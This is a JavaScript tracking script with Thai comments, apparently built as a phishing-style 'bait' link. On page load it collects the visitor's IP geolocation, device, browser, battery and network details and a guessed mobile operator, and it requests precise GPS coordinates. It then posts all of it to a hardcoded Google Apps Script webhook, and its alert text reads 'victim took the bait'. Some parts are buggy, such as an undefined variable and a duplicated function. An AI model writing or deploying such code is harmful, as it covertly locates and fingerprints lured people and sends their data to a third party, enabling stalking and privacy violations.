// ฟังก์ชันดึง tracking key และ case name จาก URL parameters
function getUrlParameters() {
  try {
    const urlParams = new URLSearchParams(window.location.search);
    const trackingKey = urlParams.get('daily') || "ไม่มีค่า";
    const caseName = urlParams.get('case') || "ไม่มีค่า";
    
    console.log("ดึงค่าจาก URL parameters:");
    console.log("- trackingKey:", trackingKey);
    console.log("- caseName:", caseName);
    
    return {
      trackingKey: trackingKey,
      caseName: caseName
    };
  } catch (error) {
    console.error("ไม่สามารถดึงพารามิเตอร์จาก URL ได้:", error);
    return {
      trackingKey: "ไม่มีค่า",
      caseName: "ไม่มีค่า"
    };
  }
}

// ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
(function() {
  // เก็บข้อมูลทั่วไป
  const timestamp = new Date().toLocaleString('th-TH', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
  
  // ดึง tracking key และ case name จาก URL
  const { trackingKey, caseName } = getUrlParameters();

  // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ
  const deviceInfo = getDetailedDeviceInfo();
  const screenSize = `${window.screen.width}x${window.screen.height}`;
  const screenColorDepth = window.screen.colorDepth;
  const devicePixelRatio = window.devicePixelRatio || 1;
  const referrer = document.referrer || "ไม่มีข้อมูล";
  const language = navigator.language || navigator.userLanguage || "ไม่มีข้อมูล";
  const platform = navigator.platform || "ไม่มีข้อมูล";
  const connection = getConnectionInfo();
  const browser = detectBrowser();

  // ตรวจสอบการใช้งานแบตเตอรี่
  getBatteryInfo().then(batteryData => {
    // รวบรวมข้อมูลทั้งหมด
    const allDeviceData = {
      ...deviceInfo,
      screenSize,
      screenColorDepth,
      devicePixelRatio,
      language,
      platform,
      browser,
      connection,
      battery: batteryData
    };

    // สร้างตัวแปรเพื่อเก็บข้อมูลที่จะส่ง
    let dataToSend = {};
    
    // ตรวจสอบ IP และข้อมูลเบอร์โทรศัพท์
    Promise.all([
      getIPDetails().catch(error => ({ip: "ไม่สามารถระบุได้"})),
      estimatePhoneNumber().catch(() => null)
    ])
    .then(([ipData, phoneInfo]) => {
      // เก็บข้อมูลที่จำเป็นทั้งหมด
      dataToSend = {
        timestamp: timestamp,
        ip: ipData,
        deviceInfo: allDeviceData,
        phoneInfo: phoneInfo,
        referrer: referrer,
        trackingKey: trackingKey || "ไม่มีค่า",
        caseName: caseName || "ไม่มีค่า",
        useServerMessage: true,
        requestId: generateUniqueId() // สร้าง ID เฉพาะสำหรับการร้องขอนี้
      };
      
      // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 5 วินาที
      if (navigator.geolocation) {
        const locationPromise = new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            position => {
              resolve({
                lat: position.coords.latitude,
                long: position.coords.longitude,
                accuracy: position.coords.accuracy,
                gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
              });
            },
            error => {
              console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
              resolve("ไม่มีข้อมูล");
            },
            {
              timeout: 5000,
              enableHighAccuracy: true
            }
          );
        });
        
        // รอข้อมูลพิกัดไม่เกิน 5 วินาที
        Promise.race([
          locationPromise,
          new Promise(resolve => setTimeout(() => resolve("ไม่มีข้อมูล"), 5000))
        ])
        .then(location => {
          // เพิ่มข้อมูลพิกัดเข้าไปในข้อมูลที่จะส่ง
          dataToSend.location = location;
          
          // ส่งข้อมูลทั้งหมดเพียงครั้งเดียว
          sendToLineNotify(dataToSend);
        });
      } else {
        // ถ้าไม่สามารถใช้ Geolocation API ได้
        dataToSend.location = "ไม่มีข้อมูล";
        sendToLineNotify(dataToSend);
      }
    });
  });
})();

// สร้าง ID เฉพาะสำหรับการร้องขอ
function generateUniqueId() {
  return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
function getDetailedDeviceInfo() {
  const userAgent = navigator.userAgent;
  const vendor = navigator.vendor || "ไม่มีข้อมูล";
  const platform = navigator.platform || "ไม่มีข้อมูล"; // Get platform here for OS info

  // ตรวจสอบประเภทอุปกรณ์ (ปรับปรุงเล็กน้อย)
  const isMobile = /Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  // More specific tablet check (covers more Android tablets)
  const isTablet = /(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(userAgent);
  const deviceType = isTablet ? "แท็บเล็ต" : (isMobile ? "มือถือ" : "คอมพิวเตอร์");

  // ดึงชื่อรุ่นอุปกรณ์ (ประมาณการจาก User Agent - มีข้อจำกัด)
  let deviceModel = "ไม่สามารถระบุได้";
  let osInfo = platform; // Use navigator.platform as a base for OS

  // --- iOS Detection ---
  const iPhoneMatch = userAgent.match(/iPhone OS (\d+)_(\d+)(?:_(\d+))?/i);
  const iPadMatch = userAgent.match(/iPad;.*CPU.*OS (\d+)_(\d+)(?:_(\d+))? like Mac OS X/i);
  const iPodMatch = userAgent.match(/iPod touch;.*CPU.*OS (\d+)_(\d+)(?:_(\d+))? like Mac OS X/i);

  if (iPhoneMatch) {
    const version = `${iPhoneMatch[1]}.${iPhoneMatch[2]}${iPhoneMatch[3] ? '.' + iPhoneMatch[3] : ''}`;
    deviceModel = "iPhone";
    osInfo = `iOS ${version}`;
  } else if (iPadMatch) {
    const version = `${iPadMatch[1]}.${iPadMatch[2]}${iPadMatch[3] ? '.' + iPadMatch[3] : ''}`;
    deviceModel = "iPad";
    osInfo = `iPadOS ${version}`; // More specific for newer iPads
  } else if (iPodMatch) {
    const version = `${iPodMatch[1]}.${iPodMatch[2]}${iPodMatch[3] ? '.' + iPodMatch[3] : ''}`;
    deviceModel = "iPod Touch";
    osInfo = `iOS ${version}`;
  }
  // --- Android Detection ---
  else if (/android/i.test(userAgent)) {
    const androidVersionMatch = userAgent.match(/Android\s+([\d.]+)/i);
    const androidModelMatch = userAgent.match(/Android.*?; ([^)]+)\)/i); // Try to capture model after semicolon

    osInfo = `Android ${androidVersionMatch ? androidVersionMatch[1] : 'ไม่ทราบเวอร์ชัน'}`;

    if (androidModelMatch && androidModelMatch[1]) {
      // Clean up the model string (remove "Build" part etc.)
      deviceModel = androidModelMatch[1].split(' Build/')[0].trim();
    } else {
      deviceModel = "Android Device (ไม่ระบุรุ่น)"; // Default if model extraction fails
    }
  }
  // --- Windows Detection ---
  else if (/windows nt/i.test(userAgent)) {
    osInfo = "Windows";
    const winVerMatch = userAgent.match(/Windows NT (\d+\.\d+)/i);
    if (winVerMatch) {
      switch (winVerMatch[1]) {
        case '10.0': osInfo = 'Windows 10/11'; break;
        case '6.3': osInfo = 'Windows 8.1'; break;
        case '6.2': osInfo = 'Windows 8'; break;
        case '6.1': osInfo = 'Windows 7'; break;
        case '6.0': osInfo = 'Windows Vista'; break;
        case '5.1': osInfo = 'Windows XP'; break;
      }
    }
    deviceModel = "PC"; // Generally PC for Windows NT
  }
  // --- macOS Detection ---
  else if (/macintosh|mac os x/i.test(userAgent)) {
    osInfo = "macOS";
    const macVerMatch = userAgent.match(/Mac OS X (\d+)_(\d+)(?:_(\d+))?/i);
    if (macVerMatch) {
      osInfo = `macOS ${macVerMatch[1]}.${macVerMatch[2]}${macVerMatch[3] ? '.' + macVerMatch[3] : ''}`;
    }
    deviceModel = "Mac";
  }
   // --- Linux Detection ---
  else if (/linux/i.test(userAgent)) {
    osInfo = "Linux";
    // Linux model is hard to determine, often it's just "PC" or "Unknown"
    deviceModel = /x11|wayland/i.test(userAgent) ? "PC (Linux)" : "Linux Device";
  }

  // หมายเหตุ: การระบุรุ่นอุปกรณ์ที่แม่นยำ 100% จาก User Agent เป็นเรื่องท้าทาย
  // ข้อมูลนี้เป็นการประมาณการที่ดีที่สุดเท่าที่จะทำได้

  return {
    userAgent: userAgent,
    vendor: vendor,
    deviceType: deviceType,
    deviceModel: deviceModel,
    platform: osInfo // Return the derived OS info instead of raw platform
  };
}

// ฟังก์ชันตรวจสอบประเภทการเชื่อมต่อแบบละเอียด
function getConnectionInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

  let connectionInfo = {
    type: "ไม่สามารถระบุได้", // e.g., 'wifi', 'cellular', 'ethernet'
    effectiveType: "ไม่สามารถระบุได้", // e.g., '4g', '3g', 'slow-2g'
    downlink: "ไม่สามารถระบุได้", // Mbps
    rtt: "ไม่สามารถระบุได้", // ms
    saveData: false,
    isWifi: false,
    isMobile: false,
    networkType: "ไม่สามารถระบุได้" // Simplified type (WiFi, Mobile Data, etc.)
  };

  if (connection) {
    // เก็บข้อมูลพื้นฐาน
    connectionInfo.type = connection.type || "ไม่สามารถระบุได้";
    connectionInfo.effectiveType = connection.effectiveType || "ไม่สามารถระบุได้";
    connectionInfo.downlink = connection.downlink !== undefined ? connection.downlink : "ไม่สามารถระบุได้";
    connectionInfo.rtt = connection.rtt !== undefined ? connection.rtt : "ไม่สามารถระบุได้";
    connectionInfo.saveData = connection.saveData || false;

    // ตรวจสอบประเภทเครือข่ายหลัก
    if (connection.type === 'wifi') {
      connectionInfo.isWifi = true;
      connectionInfo.networkType = "WiFi";
    } else if (connection.type === 'ethernet') {
       connectionInfo.networkType = "Ethernet (สาย LAN)";
    } else if (['cellular', 'bluetooth', 'wimax', 'other', 'unknown'].includes(connection.type) || !connection.type) {
       // Consider cellular or potentially mobile if type indicates it or is unknown/other
       // Rely more on effectiveType for mobile data speed indication
       connectionInfo.isMobile = ['cellular', 'other', 'unknown', undefined, null].includes(connection.type); // Assume mobile if not explicitly wifi/ethernet

       // ระบุประเภทเครือข่ายโทรศัพท์จาก effectiveType
       switch (connection.effectiveType) {
         case 'slow-2g':
         case '2g':
           connectionInfo.networkType = "Mobile Data (2G)";
           break;
         case '3g':
           connectionInfo.networkType = "Mobile Data (3G)";
           break;
         case '4g':
           connectionInfo.networkType = "Mobile Data (4G/LTE)";
           break;
         // Note: '5g' is not yet part of the standard effectiveType,
         // but some browsers might expose it via connection.type directly or custom properties.
         // We primarily rely on effectiveType here.
         default:
            // If effectiveType is unknown but type suggests mobile, label it generally
            connectionInfo.networkType = connectionInfo.isMobile ? "Mobile Data" : "Unknown";
            break;
       }
       // If type is explicitly cellular, ensure isMobile is true
       if (connection.type === 'cellular') {
           connectionInfo.isMobile = true;
       }
    } else {
        connectionInfo.networkType = connection.type; // Handle other potential types like 'bluetooth'
    }

  } else {
      // Fallback if navigator.connection is not supported
      connectionInfo.networkType = "ไม่รองรับ API";
  }

  return connectionInfo;
}

// ฟังก์ชันตรวจสอบระดับแบตเตอรี่
async function getBatteryInfo() {
  try {
    // ตรวจสอบว่าสามารถเข้าถึง Battery API ได้หรือไม่
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      return {
        level: Math.floor(battery.level * 100) + "%",
        charging: battery.charging ? "กำลังชาร์จ" : "ไม่ได้ชาร์จ"
      };
    }

    return "ไม่สามารถเข้าถึงข้อมูลแบตเตอรี่ได้";
  } catch (error) {
    return "ไม่สามารถเข้าถึงข้อมูลแบตเตอรี่ได้";
  }
}

// ฟังก์ชันตรวจสอบประเภทเบราว์เซอร์
function detectBrowser() {
  const userAgent = navigator.userAgent;
  let browserName = "ไม่ทราบ";
  let browserVersion = "ไม่ทราบ";

  // Order matters: Check for Edge Chromium first, then older Edge, then Chrome
  if (/\sedg\//i.test(userAgent)) { // Edge Chromium (uses "Edg/")
    browserName = "Microsoft Edge (Chromium)";
    browserVersion = userAgent.match(/\sedg\/([\d.]+)/i)[1];
  } else if (/\sedge\//i.test(userAgent)) { // Older Edge (uses "Edge/")
    browserName = "Microsoft Edge (Legacy)";
    browserVersion = userAgent.match(/\sedge\/([\d.]+)/i)[1];
  } else if (/opr\/|opera/i.test(userAgent)) { // Opera
    browserName = "Opera";
    browserVersion = userAgent.match(/(?:opr|opera)[\s\/]([\d.]+)/i)[1];
  } else if (/chrome/i.test(userAgent) && !/chromium/i.test(userAgent) && navigator.vendor === "Google Inc.") { // Chrome (ensure not other Chromium browsers)
    browserName = "Chrome";
    browserVersion = userAgent.match(/chrome\/([\d.]+)/i)[1];
  } else if (/firefox/i.test(userAgent)) { // Firefox
    browserName = "Firefox";
    browserVersion = userAgent.match(/firefox\/([\d.]+)/i)[1];
  } else if (/fxios/i.test(userAgent)) { // Firefox on iOS
    browserName = "Firefox (iOS)";
    browserVersion = userAgent.match(/fxios\/([\d.]+)/i)[1];
  } else if (/samsungbrowser/i.test(userAgent)) { // Samsung Browser
    browserName = "Samsung Browser";
    browserVersion = userAgent.match(/samsungbrowser\/([\d.]+)/i)[1];
  } else if (/safari/i.test(userAgent) && navigator.vendor.includes("Apple")) { // Safari (check vendor to be more sure)
    browserName = "Safari";
    // Version can be tricky, sometimes it's 'Version/', sometimes inferred from OS
    const versionMatch = userAgent.match(/version\/([\d.]+)/i);
    if (versionMatch) {
        browserVersion = versionMatch[1];
    } else {
        // Try to infer from WebKit version or OS version if 'Version/' is missing
        const webkitMatch = userAgent.match(/applewebkit\/([\d.]+)/i);
        if (webkitMatch) browserVersion = `(WebKit ${webkitMatch[1]})`; // Indicate it's an estimate
    }
  } else if (/msie|trident/i.test(userAgent)) { // Internet Explorer
    browserName = "Internet Explorer";
    browserVersion = userAgent.match(/(?:msie |rv:)([\d.]+)/i)[1];
  } else {
    // Attempt to find a generic name/version pattern
    const genericMatch = userAgent.match(/([a-z]+)\/([\d.]+)/i);
    if (genericMatch) {
        browserName = genericMatch[1];
        browserVersion = genericMatch[2];
    }
  }

  return `${browserName} ${browserVersion}`;
}

// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้ ipinfo.io)
async function getIPDetails() {
  try {
    // ใช้ ipinfo.io ซึ่งรวม IP และรายละเอียดในครั้งเดียว (ฟรี ไม่ต้องใช้ API key, มี rate limit)
    const response = await fetch('https://ipinfo.io/json');
    if (!response.ok) {
      throw new Error(`ipinfo.io request failed with status ${response.status}`);
    }
    const ipDetails = await response.json();

    // จัดรูปแบบข้อมูลให้สอดคล้องกับโครงสร้างเดิม + เพิ่มเติม
    return {
      ip: ipDetails.ip || "ไม่สามารถระบุได้",
      hostname: ipDetails.hostname || "ไม่มีข้อมูล", // เพิ่ม hostname
      city: ipDetails.city || "ไม่ทราบ",
      region: ipDetails.region || "ไม่ทราบ",
      country: ipDetails.country || "ไม่ทราบ", // ipinfo ใช้ 'country' code (e.g., TH)
      loc: ipDetails.loc || "ไม่มีข้อมูล", // พิกัด lat,long จาก IP
      org: ipDetails.org || "ไม่ทราบ", // องค์กร/ISP (ASN + Name)
      postal: ipDetails.postal || "ไม่มีข้อมูล", // รหัสไปรษณีย์
      timezone: ipDetails.timezone || "ไม่ทราบ",
      // แยก ASN และ ISP/Org name ถ้าเป็นไปได้
      asn: ipDetails.org ? ipDetails.org.split(' ')[0] : "ไม่ทราบ",
      isp: ipDetails.org ? ipDetails.org.substring(ipDetails.org.indexOf(' ') + 1) : "ไม่ทราบ"
    };
  } catch (error) {
    console.error("ไม่สามารถดึงข้อมูล IP จาก ipinfo.io ได้:", error);
    // ลองใช้ fallback (ipify) หาก ipinfo ล้มเหลว
    try {
      const basicResponse = await fetch('https://api.ipify.org?format=json');
      const basicData = await basicResponse.json();
      return { ip: basicData.ip || "ไม่สามารถระบุได้" }; // คืนค่า IP พื้นฐาน
    } catch (fallbackError) {
      console.error("ไม่สามารถดึง IP จาก fallback (ipify) ได้:", fallbackError);
      return { ip: "ไม่สามารถระบุได้" };
    }
  }
}

// ฟังก์ชันที่พยายามประมาณการเบอร์โทรศัพท์ (มีข้อจำกัด)
async function estimatePhoneNumber() {
  const phoneInfo = {
    mobileOperator: "ไม่สามารถระบุได้", // Determined by ISP/Network info
    possibleOperator: "ไม่สามารถระบุได้", // Best guess based on ISP name
    countryCode: "ไม่สามารถระบุได้", // From IP Geolocation
    remarks: "ไม่สามารถระบุเบอร์โทรศัพท์โดยตรงจากเบราว์เซอร์" // Privacy limitation
  };

  try {
    // 1. Get IP Details (includes ISP/Org info)
    const ipDetails = await getIPDetails(); // Reuse existing function

    // 2. Determine Country Code from IP
    if (ipDetails.country) {
      phoneInfo.countryCode = ipDetails.country; // e.g., "TH"
      // You could map common country codes to dialing codes if needed
      // if (ipDetails.country === "TH") phoneInfo.countryCode = "+66";
    }

    // 3. Estimate Operator from ISP/Org Name
    const ispInfo = ipDetails.isp || ipDetails.org || ""; // Use ISP or Org name
    const thaiOperators = {
      "AIS": ["AIS", "Advanced Info Service", "AWN", "ADVANCED WIRELESS NETWORK"],
      "DTAC": ["DTAC", "Total Access Communication", "DTN", "DTAC TriNet"],
      "TRUE": ["TRUE", "True Move", "TrueMove", "True Corporation", "Real Future"], // Removed TrueOnline as it's broadband
      "NT": ["CAT", "TOT", "National Telecom", "NT", "CAT Telecom", "TOT Public Company Limited"],
      // Removed 3BB as it's primarily broadband
    };

    for (const [operator, keywords] of Object.entries(thaiOperators)) {
      if (keywords.some(keyword => ispInfo.toLowerCase().includes(keyword.toLowerCase()))) {
        phoneInfo.possibleOperator = operator;
        phoneInfo.mobileOperator = operator; // Assume ISP indicates the mobile operator
        break;
      }
    }

    // 4. Check Network Connection Type
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection && connectionInfo.isMobile) { // Use the result from getConnectionInfo
        phoneInfo.remarks = `เชื่อมต่อผ่านเครือข่ายมือถือ (${connectionInfo.networkType})`;
        if (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้") {
            phoneInfo.remarks += ` - เครือข่าย: ${phoneInfo.possibleOperator}`;
        }
    } else if (connection && connectionInfo.isWifi) {
         phoneInfo.remarks = `เชื่อมต่อผ่าน WiFi (ISP: ${ispInfo || 'ไม่ทราบ'})`;
         // If connected via WiFi but ISP is a known mobile operator, it might be tethering
         if (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้") {
             phoneInfo.remarks += ` - อาจเป็นการ Tethering จาก ${phoneInfo.possibleOperator}`;
         }
    } else {
        phoneInfo.remarks += ` (ISP: ${ispInfo || 'ไม่ทราบ'})`;
    }

    // Note: User Agent sniffing for operator is highly unreliable and generally removed from modern UAs.

    return phoneInfo;

  } catch (error) {
    console.error("ไม่สามารถประมาณการข้อมูลเครือข่ายมือถือได้:", error);
    // Return default info with error remark
    phoneInfo.remarks = "เกิดข้อผิดพลาดในการดึงข้อมูลเครือข่าย";
    return phoneInfo;
  }
}

// ฟังก์ชันพยายามดึงข้อมูลตำแหน่ง
function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName) {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(position) {
        // เมื่อได้รับพิกัด
        const lat = position.coords.latitude;
        const long = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const locationData = {
          lat: lat,
          long: long,
          accuracy: accuracy,
          gmapLink: `https://www.google.com/maps?q=${lat},${long}`
        };

        // ส่งข้อมูลอีกครั้งพร้อมพิกัด
        sendToLineNotify(ipData, locationData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName);
      },
      function(error) {
        console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
        // ไม่ต้องส่งข้อมูลอีกครั้ง เพราะส่งไปแล้วในครั้งแรก
      },
      {
        timeout: 5000,
        enableHighAccuracy: true
      }
    );
  }
}

// ฟังก์ชันสร้างข้อความแจ้งเตือนแบบละเอียด
function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName) {
  // ข้อความหลัก
  const message = [
    "🎣แจ้งเตือนเหยื่อกินเบ็ด\n",
    `⏰เวลา: ${timestamp}`,
  ];
  // เพิ่มข้อมูล Case Name (ถ้ามี)
  if (caseName && caseName !== "ไม่มีค่า") {
    message.push(`📂ชื่อเคส: ${caseName}`);
  }
  // เพิ่มข้อมูล Tracking Key (ถ้ามี)
  if (trackingKey && trackingKey !== "ไม่มีค่า") {
    message.push(`🔑Tracking Key: ${trackingKey}`);
  }
  // --- ข้อมูล IP ละเอียด ---
  message.push(`🌐IP: ${ipData.ip || "ไม่มีข้อมูล"}`);
  if (ipData.hostname && ipData.hostname !== "ไม่มีข้อมูล") {
    message.push(`   - Hostname: ${ipData.hostname}`);
  }
  if (ipData.city && ipData.country) {
    // ใช้ country code ที่ได้จาก ipinfo (e.g., TH)
    message.push(`📍ตำแหน่ง (IP): ${ipData.city}, ${ipData.region}, ${ipData.country}`);
  }
  if (ipData.loc && ipData.loc !== "ไม่มีข้อมูล") {
    message.push(`   - พิกัด (IP): ${ipData.loc}`);
  }
  if (ipData.postal && ipData.postal !== "ไม่มีข้อมูล") {
    message.push(`   - รหัสไปรษณีย์: ${ipData.postal}`);
  }
  if (ipData.org && ipData.org !== "ไม่ทราบ") {
    message.push(`🏢องค์กร/ISP: ${ipData.org}`); // แสดงข้อมูล org เต็มๆ
  } else if (ipData.isp && ipData.isp !== "ไม่ทราบ") {
    message.push(`🔌เครือข่าย: ${ipData.isp}`); // Fallback ถ้าไม่มี org
  }
  if (ipData.timezone && ipData.timezone !== "ไม่ทราบ") {
    message.push(`   - Timezone: ${ipData.timezone}`);
  }
  // --- จบข้อมูล IP ---

  // ข้อมูลพิกัด GPS (ถ้ามี)
  if (location && location !== "ไม่มีข้อมูล" && location.lat && location.long) {
    message.push(`📍พิกัด GPS: ${location.lat}, ${location.long} (แม่นยำ ±${Math.round(location.accuracy)}m)`);
    message.push(`🗺️ลิงก์แผนที่: ${location.gmapLink}`);
  } else {
    message.push(`📍พิกัด GPS: ไม่สามารถระบุได้ (ผู้ใช้ไม่อนุญาต)`);
  }

  // ข้อมูลอุปกรณ์
  message.push(`📱อุปกรณ์: ${deviceData.deviceType} - ${deviceData.deviceModel}`);
  message.push(`🖥️ระบบปฏิบัติการ: ${deviceData.platform}`); // ใช้ platform ที่ได้จาก getDetailedDeviceInfo
  message.push(`🌐เบราว์เซอร์: ${deviceData.browser}`);

  // ข้อมูลหน้าจอ
  message.push(`📊ขนาดหน้าจอ: ${deviceData.screenSize} (${deviceData.screenColorDepth}bit, x${deviceData.devicePixelRatio})`);

  // ข้อมูลระบบ
  message.push(`🖥️ระบบปฏิบัติการ: ${deviceData.platform}`);
  message.push(`🔤ภาษา: ${deviceData.language}`);

  // ข้อมูลการเชื่อมต่อ (เพิ่มเติม)
  if (typeof deviceData.connection === 'object') {
    // แสดงประเภทการเชื่อมต่อ (WiFi หรือ Mobile)
    const networkTypeIcon = deviceData.connection.isWifi ? "📶" : "📱";
    const networkType = deviceData.connection.networkType;
    message.push(`${networkTypeIcon}การเชื่อมต่อ: ${networkType} (${deviceData.connection.effectiveType})`);
    message.push(`⚡ความเร็วโดยประมาณ: ${deviceData.connection.downlink} Mbps (RTT: ${deviceData.connection.rtt}ms)`);

    // ถ้าเป็น Mobile ให้แสดงข้อมูลเพิ่มเติม
    if (deviceData.connection.isMobile && phoneInfo) {
      message.push(`📞เครือข่ายมือถือ: ${phoneInfo.possibleOperator}`);
      if (phoneInfo.countryCode !== "ไม่สามารถระบุได้") {
        message.push(`🏴รหัสประเทศ: ${phoneInfo.countryCode}`);
      }
      message.push(`📝หมายเหตุ: ${phoneInfo.remarks}`);
    }
  }

  // ข้อมูลแบตเตอรี่
  if (typeof deviceData.battery === 'object') {
    message.push(`🔋แบตเตอรี่: ${deviceData.battery.level} (${deviceData.battery.charging})`);
  }

  return message.join("\n");
}

// ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
function sendToLineNotify(dataToSend) {
  const webhookUrl = 'https://script.google.com/macros/s/AKfycbydls9VdR40-hUr_2uCGz7WXubw94sXLWVjUnd9Orh5vOAuarKfwSYvYI_ZpXKMvK13gg/exec';

  // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
  if (!dataToSend.requestId) {
    dataToSend.requestId = generateUniqueId();
  }
  
  // ใช้ sessionStorage เพื่อป้องกันการส่งซ้ำในวินโดว์เดียวกัน
  const sentRequests = JSON.parse(sessionStorage.getItem('sentRequests') || '[]');
  if (sentRequests.includes(dataToSend.requestId)) {
    console.log("ข้อมูลนี้เคยส่งแล้ว (requestId: " + dataToSend.requestId + ")");
    return;
  }
  
  console.log("กำลังส่งข้อมูลไป webhook (requestId: " + dataToSend.requestId + ")");

  // ส่งข้อมูล
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(dataToSend),
    mode: 'no-cors'
  })
  .then(() => {
    console.log("ส่งข้อมูลไปยัง Server สำเร็จ");
    
    // บันทึก requestId ที่ส่งสำเร็จแล้ว
    sentRequests.push(dataToSend.requestId);
    sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
  })
  .catch(error => {
    console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
  });
}

// สร้าง unique ID สำหรับแต่ละการร้องขอ
function generateUniqueId() {
  return Date.now().toString(36) + Math.random().toString(36).substring(2, 10);
}
